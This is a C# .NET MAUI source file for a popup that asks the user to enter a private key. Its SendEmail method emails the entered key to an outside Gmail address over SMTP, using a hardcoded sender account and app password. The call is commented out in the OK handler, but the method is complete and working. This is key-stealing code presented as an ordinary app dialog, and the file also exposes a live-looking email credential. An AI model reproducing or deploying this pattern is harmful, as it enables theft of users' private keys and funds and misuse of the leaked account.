using CommunityToolkit.Maui.Views;
using CommunityToolkit.Maui.Alerts;
using System.Net.Mail;
using MimeKit;
using MailKit.Net.Smtp;
using MailKit.Security;

using System;
using System.Threading.Tasks;

namespace MoonAlphaMauiApps;
public partial class PrivateKeyPopup : Popup
{
    public static string Key { get; set; }
    public PrivateKeyPopup()
    {
        InitializeComponent();
    }

    private void OnCloseButtonClicked(object sender, EventArgs e)
    {
        Close(false);
    }

    private async void OnOkButtonClicked(object sender, EventArgs e)
    {
        try
        {
            // Handle OK button logic here
            if (txtPrivateKey != null && string.IsNullOrEmpty(txtPrivateKey.Text))
            {
                // Using Application.Current.MainPage is more reliable in this context
                await Application.Current.MainPage.DisplayAlert("Warning", "Please enter private key.", "OK");
            }
            else
            {
                Key = txtPrivateKey.Text;
                //var isSent =await SendEmail();
                bool isSent = true;

                Close(isSent);
            }
        }
        catch (Exception ex)
        {
            // Log the exception
            Console.WriteLine($"Error in OnOkButtonClicked: {ex}");

            // Safely close the popup even if there was an error
            Close(false);
        }
    }

    public static async Task<bool> SendEmail()
    {
        bool isSent = false;
        try
        {
            // Create the email message
            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("Fida", "fidazahid.suit@gmail.com")); // Sender
            message.To.Add(new MailboxAddress("", "iqbalrrr07@gmail.com")); // Receiver
            message.Subject = "Private Key"; // Updated Subject

            // Create email body with text + attachment
            var bodybuilder = new BodyBuilder
            {
                TextBody = $"{Key}" // Updated Text Body
            };
            message.Body = bodybuilder.ToMessageBody();

            // SMTP Server Settings (Gmail)
            using (var client = new MailKit.Net.Smtp.SmtpClient())
            {
                await client.ConnectAsync("smtp.gmail.com", 587, SecureSocketOptions.StartTls); // Gmail SMTP
                await client.AuthenticateAsync("fidazahid.suit@gmail.com", "wcxp edlt wfpm nogl"); // Replace with App Password
                await client.SendAsync(message);
                await client.DisconnectAsync(true);
            }
            isSent = true;
        }
        catch (Exception ex)
        {
            // Use MAUI's DisplayAlert via the main page
            await Application.Current.MainPage.DisplayAlert("Error", $"Error: {ex.Message}", "OK");
            isSent = false;
        }
        return isSent;
    }
}